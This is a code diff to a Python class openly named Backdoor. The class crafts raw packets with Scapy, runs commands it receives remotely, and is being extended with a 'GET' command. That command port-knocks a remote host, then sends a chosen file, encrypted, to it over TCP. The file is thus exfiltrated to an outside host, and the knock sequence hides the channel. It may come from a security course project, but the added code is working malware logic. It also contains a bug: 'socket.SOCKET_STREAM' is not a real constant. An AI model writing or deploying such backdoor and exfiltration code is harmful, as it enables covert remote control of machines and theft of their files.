@@ -7,7 +7,7 @@ import helpers
 
 class Backdoor(object):
 
-    def __init__(self, lhost, lport, lisport, rhost, rport, proto, password):
+    def __init__(self, lhost, lport, lisport, rhost, rport, proto, password, kList):
         self.state = 0
         self.localIP = lhost
         self.localPort = int(lport)
@@ -16,6 +16,7 @@ class Backdoor(object):
         self.remotePort = int(rport)
         self.protocol = proto.upper()
 
+        self.knockList = kList
         self.password = password
         self.chunk_size = 16
 
@@ -52,7 +53,13 @@ class Backdoor(object):
                 helpers.cd(cmd[3:])
             except OSError as e:
                 result = str(e)
-        elif cmd[:5] == 'close':
+        elif cmd[:4] == 'GET ':
+            filename = cmd[4:]
+            if not os.path.exists(filename):
+                result = "File doesn't exist\n"
+
+            self.sendFile(filename)
+        elif cmd[:5] == 'CLOSE':
             print("Backdoor closed...\n")
             sys.exit(0)
         else:
@@ -74,6 +81,24 @@ class Backdoor(object):
             packet = IP(dst=self.remoteIP, src=self.localIP)/UDP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
 
         send(packet, verbose=False)
+
+    def sendFile(self, filename):
+        knocker = self.portKnocking(self.knockList)
+
+        time.sleep(1)
+
+        sock = socket.socket(socket.AF_INET, socket.SOCKET_STREAM)
+        sock.connect((self.remoteIP, self.listenPort))
+
+        encryptedString = encrypt.encryptedFile(filename)
+
+        sock.sendall(encryptedString)
+        sock.send(b'EOF')
+
+    def portKnocking(self, knockList):
+        for port in knockList:
+            pkt = IP(src=self.localIP, dst=self.remoteIP)/UDP(dport=port)
+            send(pkt, verbose=False)
 
     def is_incoming(self, packet):
         """
